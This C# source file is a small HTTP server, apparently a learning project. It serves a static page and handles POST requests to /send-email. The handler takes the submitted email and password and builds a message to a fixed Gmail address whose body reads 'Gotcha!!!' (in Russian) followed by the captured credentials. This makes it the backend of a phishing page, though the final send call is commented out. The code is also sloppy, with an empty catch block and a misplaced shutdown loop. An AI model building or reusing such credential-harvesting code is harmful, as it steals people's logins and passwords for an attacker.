using MyHtml.Configuration;
using MyHtml.services;
using MyHttp;
using MyHttp.Configuration;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using MimeKit;
using MimeKit.Text;
using MyHtml.handlers;
using StaticFilesHandler = MyHtml.handlers.StaticFilesHandler;

namespace HTTPServer          
{
    class Server : IEmailSenderService, IDisposable, ISendEmailHelper
    {
        HttpListener listener = new HttpListener(); // Объект, принимающий TCP-клиентов

        HttpListenerContext context;
        private HttpListenerRequest request;
        public HttpListenerResponse response;

        Appsetting config = Configurationcs.GetConfigurationcs();

        public Server()
        {

            listener.Prefixes.Add($"{config.Address}:{config.Port}/");

            listener.Start();

            Console.WriteLine("Start выполнен");

            context = listener.GetContext();

            Handler staticFilesHandler = new StaticFilesHandler();
            Handler controllerHandler = new ControllerHandler();

            staticFilesHandler.Successor = controllerHandler;
            staticFilesHandler.HandleRequest(context);

            request = context.Request;
            string abslPath = request.Url.AbsolutePath;
            
            try
            {
                var requestUrl = context.Request.Url;

                response = context.Response;

                if (!FilesHandler.FolderIsExist(config.StaticFilePath))
                {
                    FilesHandler.CreateFolder(config.StaticFilePath);
                }

                var responseText = FilesHandler.GetHtml(config.StaticFilePath);


                using (StreamReader stream = new StreamReader(responseText))
                {
                    responseText = stream.ReadToEnd();
                }

                SendEmailHelper(abslPath);

                byte[] buffer = Encoding.UTF8.GetBytes(responseText);
                // получаем поток ответа и пишем в него ответ

                response.ContentLength64 = buffer.Length;

                using (Stream output = response.OutputStream)
                {
                    output.WriteAsync(buffer, 0, buffer.Length);

                    Console.WriteLine("Запрос обработан");

                    while (Console.ReadLine() != "stop")
                    {
                        listener?.Stop();
                        output.FlushAsync();

                    }
                }

            }
            catch{

            }

        }

        private void WriteBuffer(byte[] buffer)
        {
            using (Stream output = response.OutputStream)
            {
                output.WriteAsync(buffer, 0, buffer.Length);

                Console.WriteLine("Запрос обработан");

                while (Console.ReadLine() != "stop")
                {
                    listener?.Stop();
                    output.FlushAsync();

                }
            }
        }




        public async void SendEmailHelper(string abslPath)
        {
            if (request.HttpMethod.Equals("post", StringComparison.OrdinalIgnoreCase) && abslPath == "/send-email")
            {
                var stream = new StreamReader(request.InputStream);
                //var str = stream.ReadToEndAsync();
                var str = await stream.ReadToEndAsync();
                string[] arr = str.Split("&");
                SendEmailAsync(arr[0], arr[1]);
            }
        }

        public async Task SendEmailAsync(string email, string password)
        {
            EmailISenderService emailConfig = Configurationcs.GetEmailConfig();

            string mailSender = emailConfig.mailSender;
            string passwordSender = emailConfig.passwordSender;

            var fromEmail = emailConfig.fromEmail;
            string fromName = "Tom";
            string toEmail = "somemail@gmail.com";
            string subject = "subject";
            string body = String.Format("<h1> Попался!!! </h1><p>email:{0}</p><p>password: {1}</p>", email, password);
            string smptServerHost = emailConfig.smptServerHost;
            ushort smtpServerPost = emailConfig.smtpServerPost;

            MailAddress from = new MailAddress(fromEmail, fromName);
            MailAddress to = new MailAddress(toEmail);

            MailMessage m = new MailMessage(from, to);
            m.Subject = subject;
            m.Body = body;

            SmtpClient smtp = new SmtpClient(smptServerHost, smtpServerPost);
            smtp.Credentials = new NetworkCredential(mailSender, passwordSender);
            smtp.EnableSsl = true;

            //await smtp.SendMailAsync(m);
            Console.WriteLine("Письмо отправлено");
        }
        public void Dispose()
        { }

        // public async Task SendEmailAsync1(string email, string password)
        // {
        //     // メールの送信に必要な情報
        //     var smtpHostName = "[SMTP サーバー名]";
        //     var smtpPort = 587;                         // or 25
        //     var smtpAuthUser = "[認証ユーザー名]";
        //     var smtpAuthPassword = "[認証パスワードまたはアプリパスワード]";
        //
        //     // メールの内容
        //     var from = "[送信者メールアドレス]";
        //     var to = "[送り先メールアドレス]";
        //
        //     var subject = "テストメールの件名です。";
        //     var body = "テストメールの本文です。\n改行です。";
        //     var textFormat = TextFormat.Text;
        //
        //     // MailKit におけるメールの情報
        //     var message = new MimeMessage();
        //
        //     // 送り元情報  
        //     message.From.Add(MailboxAddress.Parse(from));
        //
        //     // 宛先情報  
        //     message.To.Add(MailboxAddress.Parse(to));
        //
        //     // 表題  
        //     message.Subject = subject;
        //
        //     // 内容  
        //     var textPart = new TextPart(textFormat)
        //     {
        //         Text = body,
        //     };
        //     message.Body = textPart;
        //
        //     using var client = new SmtpClient();
        //
        //     // SMTPサーバに接続  
        //     client.Connect(smtpHostName, smtpPort, SecureSocketOptions.Auto);
        //
        //     if (string.IsNullOrEmpty(smtpAuthUser) == false)
        //     {
        //         // SMTPサーバ認証  
        //         client.Authenticate(smtpAuthUser, smtpAuthPassword);
        //     }
        //
        //     // 送信  
        //     client.Send(message);
        //
        //     // 切断  
        //     client.Disconnect(true);
        // }
    }
}
